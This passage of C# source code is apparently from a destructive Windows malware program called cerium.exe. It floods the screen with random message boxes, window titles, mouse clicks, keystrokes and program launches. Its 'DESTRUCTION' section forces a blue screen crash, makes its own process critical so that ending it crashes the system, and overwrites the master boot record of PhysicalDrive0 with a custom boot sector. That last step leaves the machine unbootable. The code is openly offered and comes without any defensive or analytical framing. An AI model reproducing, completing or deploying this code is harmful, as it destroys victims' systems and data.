                for (int i = 0; i < 24; i++)
                {
                    int codePoint = r.Next(0x20, 0xFF);
                    symbols += char.ConvertFromUtf32(codePoint);
                }

                MessageBox.Show(symbols, "???", buttons[r.Next(buttons.Length)], icons[r.Next(icons.Length)], defb[r.Next(defb.Length)]);
            }
        }

        static void cursorPos()
        {
            while (true)
            {
                Thread.Sleep(1000);

                SetCursorPos(r.Next(Screen.PrimaryScreen.Bounds.Width), r.Next(Screen.PrimaryScreen.Bounds.Height));
            }
        }
        private static void windowTitles()
        {
            while (true)
            {
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);

                Thread.Sleep(3000);

                EnumWindows(new EnumWindowsProc(ChangeWindowTitles), IntPtr.Zero);

                EnumChildWindows(GetDesktopWindow(), new EnumWindowsProc(childwnd), IntPtr.Zero);

                EnumWindows(new EnumWindowsProc(smallresize), IntPtr.Zero);

                bool ChangeWindowTitles(IntPtr hwnd, IntPtr lParam)
                {
                    string symbols = "";

                    for (int i = 0; i < 192; i++)
                    {
                        int codePoint = r.Next(0x20, 0xFF);
                        symbols += char.ConvertFromUtf32(codePoint);
                    }

                    SetWindowTextA(hwnd, symbols);
                    return true;
                }

                bool smallresize(IntPtr hWnd, IntPtr lParam) //we use a bool to do the action with all found windows
                {
                    GetWindowRect(hWnd, out RECT rect); //first, we get the current position
                    int originalX = rect.left;
                    int originalY = rect.top;
                    int ogSizeX = rect.right;
                    int ogSizeY = rect.bottom;
                    while (true)
                    {
                        SetWindowPos(hWnd, HWND_TOP, originalX + r.Next(-3, 3), originalY + r.Next(-3, 3), 0, 0, SWP_NOZORDER);
                        return true;
                    }
                }

                bool childwnd(IntPtr hWnd, IntPtr lparam)
                {
                    MoveWindow(hWnd, r.Next(x), r.Next(y), 0, 0, true);
                    return true;
                }
            }
        }

        private static void mouseClick()
        {
            while (true)
            {
                if (r.Next(2) == 1)
                {
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                    Thread.Sleep(1);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                } else
                {
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
                    Thread.Sleep(1);
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
                }
                Thread.Sleep(49);
            }
        }

        private static void key_rnd()
        {
            while (true)
            {
                Random rand = new Random();
                string keys = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                char randomKey = keys[rand.Next(keys.Length)];
                SendKeys.SendWait(randomKey.ToString());
                Thread.Sleep(1000);
            }
        }

        private static void openSoftware()
        {
            while (true)
            {
                string[] programs =
                {
                    "notepad.exe", "mspaint.exe", "write.exe", "explorer.exe",
                    "dxdiag.exe", "charmap.exe", "taskmgr.exe", "regedit.exe",
                    "cmd.exe", "calc.exe", "wscript.exe", "cscript.exe",
                    "help.exe", "narrator.exe", "devmgmt.msc", "diskmgmt.msc",
                    "fsquirt.exe", "control.exe", "mstsc.exe", "perfmon.exe",
                    "cleanmgr.exe", "iesxpress.exe", "appwiz.cpl", "desk.cpl",
                    "firewall.cpl", "inetcpl.cpl", "intl.cpl", "joy.cpl",
                    "main.cpl", "mmsys.cpl", "ncpa.cpl", "powercfg.cpl",
                    "sysdm.cpl", "telephon.cpl", "timedate.cpl", "wscui.cpl",
                    "mplayer2.exe", "winver.exe", "mobsync.exe", "odbcad32.exe",
                    "gpedit.msc", "msconfig.exe", "verifier.exe", "shrpubw.exe",
                    "sigverif.exe", "osk.exe", "iexplore.exe", "magnify.exe",
                    "wextract.exe", "mmc.exe"
                };
                Thread.Sleep(r.Next(1, 5000));

                Process.Start(programs[r.Next(programs.Length)]);
            }
        }

        // =================================================================================================================================================================================================================================================================
        
        // DESTRUCTION
        
        // =================================================================================================================================================================================================================================================================

        public static void bsod()
        {
            if (RtlAdjustPrivilege(19, true, false, out _) == 0)
            {
                NtRaiseHardError(0xDEADDEAD, 0, IntPtr.Zero, IntPtr.Zero, 6, out _);
            }
        }

        // Critical process

        static void SetAsCritical()
        {
            if (!IsAdministrator())
            {
                MessageBox.Show("Admin permissions needed", "cerium.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            Process currentProcess = Process.GetCurrentProcess();
            IntPtr handle = currentProcess.Handle;

            int isCritical = 1;

            if (NtSetInformationProcess(handle, 29, ref isCritical, sizeof(int)) == 0) { }
            else
            {
                MessageBox.Show(
                    "Failed to set my process as critical!" +
                    "\nHow about trying to disable Windows Defender?",

                    "cerium.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static bool IsAdministrator()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        // MBR killer. Beware, it bites!

        public static void KillMBR()
        {
            var mbrData = new byte[] {0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x36, 0x7C, 0xB3, 0x0B, 0xE8,
0x16, 0x00, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 0x0D, 0x0F, 0x84, 0xE3, 0x00, 0x3C, 0x53, 0x0F, 0x84,
0xBA, 0x01, 0x3C, 0x43, 0x74, 0x76, 0xEB, 0xEA, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4,
0x0E, 0xCD, 0x10, 0xEB, 0xF5, 0xC3, 0x53, 0x3D, 0x53, 0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E,
0x20, 0x43, 0x3D, 0x43, 0x72, 0x65, 0x64, 0x69, 0x74, 0x73, 0x20, 0x45, 0x6E, 0x74, 0x65, 0x72,
0x3D, 0x20, 0x44, 0x72, 0x65, 0x61, 0x6D, 0x0D, 0x0A, 0x54, 0x68, 0x65, 0x20, 0x4D, 0x42, 0x52,
0x20, 0x69, 0x73, 0x20, 0x6D, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x61, 0x6C, 0x77,
0x61, 0x72, 0x65, 0x4C, 0x61, 0x62, 0x31, 0x35, 0x30, 0x20, 0x61, 0x6B, 0x61, 0x20, 0x32, 0x2E,
0x30, 0x20, 0x69, 0x6E, 0x20, 0x41, 0x73, 0x6D, 0x2E, 0x0D, 0x0A, 0x44, 0x69, 0x64, 0x20, 0x79,
0x6F, 0x75, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x69, 0x74, 0x3F, 0x00, 0x31, 0xC0, 0x8E, 0xD8,
0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0xB0, 0x7C, 0xB3, 0x02, 0xE8, 0x7A, 0xFF, 0xEB, 0xFE,
0x4D, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20, 0x53, 0x69, 0x6C, 0x76, 0x65, 0x72, 0x20, 0x69,
0x6E, 0x20, 0x43, 0x23, 0x0D, 0x0A, 0x20, 0x53, 0x70, 0x65, 0x63, 0x69, 0x61, 0x6C, 0x20, 0x74,
0x68, 0x61, 0x6E, 0x6B, 0x73, 0x3A, 0x20, 0x43, 0x6C, 0x75, 0x74, 0x74, 0x65, 0x72, 0x2C, 0x20,
0x43, 0x69, 0x62, 0x65, 0x72, 0x42, 0x6F, 0x79, 0x2C, 0x20, 0x47, 0x65, 0x74, 0x4D, 0x42, 0x52,
0x2C, 0x20, 0x4D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x4C, 0x61, 0x62, 0x0D, 0x0A, 0x00, 0xB4,
0x00, 0xB0, 0x13, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB, 0x31, 0xD2, 0x31, 0xF6,
0x31, 0xC9, 0x31, 0xED, 0x53, 0xE8, 0x0F, 0x00, 0x5B, 0xE8, 0x3C, 0x00, 0xE8, 0x66, 0x00, 0xE8,
0x84, 0x00, 0xE8, 0x5A, 0x00, 0xEB, 0xED, 0xB9, 0x00, 0xFA, 0x31, 0xFF, 0x00, 0xD0, 0x24, 0xFF,
0x88, 0xC4, 0x80, 0xC4, 0x40, 0x80, 0xE4, 0x7F, 0x80, 0xC4, 0x10, 0x80, 0xE4, 0x3F, 0x30, 0xE0,
0x26, 0x88, 0x05, 0x47, 0x42, 0x88, 0xD0, 0x30, 0xF0, 0x24, 0x1F, 0x80, 0xFA, 0x40, 0x72, 0x05,
0x80, 0xC6, 0x01, 0x30, 0xD2, 0xE2, 0xD5, 0xC3, 0x83, 0xFE, 0x00, 0x74, 0x03, 0x4B, 0xEB, 0x01,
0x43, 0x83, 0xFB, 0x50, 0x7C, 0x0D, 0xBE, 0x01, 0x00, 0xEB, 0x08, 0x83, 0xFB, 0x00, 0x7F, 0x03,
0xBE, 0x00, 0x00, 0x42, 0x81, 0xFA, 0xC8, 0x00, 0x7D, 0x02, 0xEB, 0x02, 0x31, 0xD2, 0xC3, 0xB9,
0xFF, 0xFF, 0xE2, 0xFE, 0xC3, 0x50, 0x53, 0x51, 0x52, 0xB0, 0xB6, 0xE6, 0x43, 0x89, 0xE8, 0x89,
0xC3, 0xC1, 0xEB, 0x08, 0x09, 0xC3, 0xC1, 0xEB, 0x05, 0xF7, 0xE3, 0x25, 0xFF, 0x00, 0xE8, 0x23,
0x00, 0x5A, 0x59, 0x5B, 0x58, 0xC3, 0x50, 0x53, 0x51, 0x52, 0xB0, 0xB6, 0xE6, 0x43, 0x89, 0xE8,
0xC1, 0xE8, 0x05, 0x83, 0xE0, 0x4E, 0xF7, 0xE5, 0x25, 0xFF, 0x00, 0xE8, 0x06, 0x00, 0x45, 0x5A,
0x59, 0x5B, 0x58, 0xC3, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6, 0x61,
0xB9, 0x00, 0x20, 0xE2, 0xFE, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0xB8, 0x07, 0x53, 0xBB,
0x01, 0x00, 0xB9, 0x03, 0x00, 0xCD, 0x15, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

            IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE , IntPtr.Zero,
            OPEN_EXISTING, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, 512u, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}

// nike oneshoe